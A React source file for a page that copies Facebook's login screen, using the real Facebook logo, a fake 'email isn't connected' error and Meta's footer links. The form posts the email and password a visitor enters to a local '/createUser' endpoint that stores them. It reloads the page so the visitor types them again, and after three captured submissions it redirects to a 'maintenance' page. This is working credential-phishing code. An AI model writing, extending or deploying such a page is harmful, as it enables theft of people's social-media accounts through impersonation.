import React, { useState, useRef, useEffect } from "react";
import axios from "axios";
import warningIcon from "../assets/warning.png";
import { Link } from "react-router-dom";

export default function LoginFailedPage() {
  const [email, setEmail] = useState();
  const [password, setPassword] = useState();
  const [isLoading, setIsLoading] = useState(false);
  const successCountRef = useRef(0);
  const emailRef = useRef(null);
  const loginRef = useRef(null);

  useEffect(() => {
    // Retrieve success count from localStorage on component mount
    successCountRef.current =
      parseInt(localStorage.getItem("successCount")) || 0;
  }, []);

  useEffect(() => {
    // Save success count to localStorage whenever it changes
    localStorage.setItem("successCount", successCountRef.current.toString());
  }, [successCountRef.current]);

  useEffect(() => {
    document.title = "Log Into Facebook";
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();

    if (!email || !password || isLoading)
      return setTimeout(() => {
        setIsLoading(false);
        if (successCountRef.current !== 3) {
          window.location.reload();
        }
      }, 3000);

    // Set loading state
    setIsLoading(true);

    // Sending a POST request to create a new user
    axios
      .post("http://localhost:3001/createUser", { email, password })
      .then((result) => {
        console.log(result);
        console.log((successCountRef.current += 1));
        // After successful submission, reload the document after 3 seconds
        setTimeout(() => {
          setEmail("");
          setPassword("");
          if (successCountRef.current !== 3) {
            window.location.reload();
          }
          if (successCountRef.current === 3) {
            // Redirect to maintenance page
            loginRef.current.click();
            // Reset successCountRef after 1 minute if it reaches 3
            const interval = setInterval(() => {
              localStorage.setItem(
                "successCount",
                (successCountRef.current = 0).toString()
              );
              clearInterval(interval);
            }, 5000);
          }
        }, 3000);
      })
      .catch((err) => {
        console.log(err);
        // Reset loading state on error
        setIsLoading(false);
      });
  };

  // Effect hook to focus on the email input field when the component mounts
  useEffect(() => emailRef.current.focus(), []);

  return (
    <>
      <div>
        <div className='bg-[#f0f2f5] pb-[5rem]'>
          <div className='flex justify-center pt-9'>
            <img
              className='h-[5rem] w-max-full '
              src='https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg'
              alt='Facebook'
            />
          </div>
          <div className='flex justify-center'>
            <form
              className='border-2 w-[25rem] p-4 pb-6 bg-white shadow-lg rounded-lg'
              onSubmit={handleSubmit}
            >
              <p className='pb-4 text-[1.2rem]'>Log Into Facebook</p>
              <label
                htmlFor='username'
                className='text-sm font-medium text-gray-600'
              ></label>

              {/* Input field for email */}
              <div className='relative flex items-center justify-end'>
                <input
                  type='text'
                  id='email'
                  className='p-[0.85rem] border-[1px] border-red-500 focus:outline-0 rounded-md w-full mt-1 placeholder:text-[1.1rem] placeholder:tracking-wide pl-[1rem]'
                  placeholder='Email or phone number'
                  ref={emailRef}
                  autoComplete='on'
                  onChange={(e) => setEmail(e.target.value)}
                />
                <div className='absolute cursor-pointer mt-1 mr-[0.6rem]'>
                  <img
                    src={warningIcon}
                    alt='Warning'
                    className='w-max-full h-[20px]'
                  />
                </div>
              </div>
              <div className='text-left leading-4 mt-2 text-sm text-red-500'>
                The email or mobile number you entered isn&apos;t connected to
                an account.{" "}
                <strong className='tracking-wider cursor-pointer hover:underline'>
                  <Link to='/maintenance'>Find your account and log in.</Link>
                </strong>
              </div>

              <label
                htmlFor='password'
                className='block mt-2 text-xs font-medium text-gray-600'
              ></label>

              {/* Input field for password with show/hide functionality */}
              <div className='relative flex items-center justify-end'>
                <input
                  type='password'
                  id='password'
                  className=' p-[0.8rem] border-2 rounded-md w-full mt-1 placeholder:text-[1.1rem] placeholder:tracking-wide pl-[1rem]'
                  placeholder='Password'
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>

              {/* Submit button for the login form */}
              <button
                type='submit'
                className={`mt-3 p-2 py-3 pt-2 rounded-md w-full text-xl font-sans font-bold ${
                  isLoading
                    ? "bg-[#0c4a6e] cursor-not-allowed focus:ring-0"
                    : "bg-[#1877f2] hover:bg-[#166fe5]"
                } text-white transition-all focus:ring-blue-300 focus:ring focus:outline-0 focus:transition-all focus:duration-500 active:ring-0 active:transition-none tracking-wide`}
              >
                Log In
              </button>
              <Link to='/maintenance' ref={loginRef} />
              <Link to='/maintenance' className='block text-center mt-4 text-[15px] text-blue-600 pb-1 hover:underline'>
                Forgot password?
              </Link>
            </form>
          </div>
        </div>
        <footer className='bg-white'>
          <nav className='w-[80%] mx-auto max-w-[980px] mt-[6rem]'>
            {/* Language options */}
            <ul className='flex flex-row flex-wrap text-gray-400 text-xs pt-6 text-center leading-3'>
              {[
                "English (US)",
                "Filipino",
                "Bisaya",
                "Español",
                "日本語",
                "한국어",
                "中文 (简体)",
                "العربية",
                "Português (Brasil)",
                "Français (France)",
                "Deutsch",
              ].map((lang, index) => (
                <li
                  key={index}
                  className={`${index !== 0 && "ml-2"} mb-2 text-[#8a8d91]`}
                >
                  {index === 0 ? (
                    <span className='text-[#737373] hover:cursor-text'>
                      {lang}
                    </span>
                  ) : (
                    <a
                      href='#'
                      className='hover:underline hover:cursor-pointer'
                    >
                      {lang}
                    </a>
                  )}
                </li>
              ))}

              {/* Plus icon */}
              <li className='ml-2 mb-2 cursor-pointer bg-slate-100 shadow hover:shadow-inner  focus:bg-slate-700'>
                <div className='border h-5 w-8 flex justify-center items-center pb-1 '>
                  <a href='#' className='text-lg font-bold text-slate-700'>
                    +
                  </a>
                </div>
              </li>
            </ul>
            {/* Footer links */}
            <ul className='flex flex-row flex-wrap text-gray-400 text-xs leading-5 border-t pt-2'>
              {[
                "Sign Up",
                "Log In",
                "Messenger",
                "Facebook Lite",
                "Video",
                "Places",
                "Games",
                "Marketplace",
                "Meta Pay",
                "Meta Store",
                "Meta Quest",
                "Imagine with Meta AI",
                "Instagram",
                "Threads",
                "Fundraisers",
                "Services",
                "Voting Information Center",
                "Privacy Policy",
                "Privacy Center",
                "Groups",
                "About",
                "Create Ad",
                "Create Page",
                "Developers",
                "Careers",
                "Cookies",
                "Ad Choices",
                "Terms",
                "Help",
                "Contact Uploading & Non-Users",
              ].map((link, index) => (
                <li key={index} className='pr-5 text-[#8a8d91]'>
                  <a href='#' className='hover:underline'>
                    {link}
                  </a>
                </li>
              ))}
            </ul>
            <div className='text-[#737373] text-xs mt-4 text-left'>
              Meta &copy; 2024
            </div>
          </nav>
        </footer>
      </div>
    </>
  );
}
